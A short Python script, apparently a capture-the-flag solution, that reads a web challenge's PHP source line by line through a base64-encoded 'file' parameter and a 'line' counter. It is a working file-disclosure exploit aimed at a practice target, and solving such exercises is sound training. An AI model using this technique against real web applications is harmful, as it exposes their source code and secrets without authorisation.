#!/usr/bin/env python3.4

import requests

url = 'http://ctf.idf.cn/game/web/40/index.php?file=aW5kZXgucGhw&line='
line= 0
s = requests.session()
while True:
	r = s.get(url+str(line))
	if not r.text:
		break
	print(r.text.strip('\n'))
	line += 1
